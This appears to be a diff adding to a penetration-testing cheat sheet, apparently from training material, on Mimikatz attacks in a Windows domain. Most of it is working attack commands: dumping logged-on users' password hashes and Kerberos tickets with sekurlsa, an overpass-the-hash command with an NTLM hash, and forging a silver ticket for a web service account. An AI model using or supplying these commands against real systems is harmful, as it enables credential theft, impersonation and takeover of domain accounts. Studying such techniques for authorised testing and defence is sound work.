@@ -1,5 +1,14 @@
 #!/usr/bin/peno
 
+#Executing mimikatz on a domain workstation
+#Dumping hashes for all users logged on to the current workstation or server, including remote logins like Remote Desktop sessions
+#Extracting Kerberos tickets with mimikatz
+mimikatz.exe
+mimikatz # privilege::debug
+mimikatz # sekurlsa::logonpasswords
+mimikatz # sekurlsa::tickets
+
+#Example
 C:\> C:\Tools\password_attacks\mimikatz.exe
 ...
 mimikatz # privilege::debug
@@ -27,3 +36,15 @@ User : Administrator
 RID  : 000001f5 (501)
 User : Guest
 
+#Overpass the Hash
+#Creating a process with a different users NTLM password hash
+mimikatz # sekurlsa::pth /user:jeff_admin /domain:corp.com /ntlm:e2b475c11da2a0748290d87aa966c327 /run:PowerShell.exe
+
+
+#Pass the Ticket
+#Creating a silver ticket for the iis_service service account
+mimikatz # kerberos::purge
+Ticket(s) purge for current session is OK
+mimikatz # kerberos::list
+mimikatz # kerberos::golden /user:offsec /domain:corp.com /sid:S-1-5-21-1602875587-2787523311-2599479668 /target:CorpWebServer.corp.com /service:HTTP /rc4:E2B475C11DA2A0748290D87AA966C327 >
+mimikatz # kerberos::list
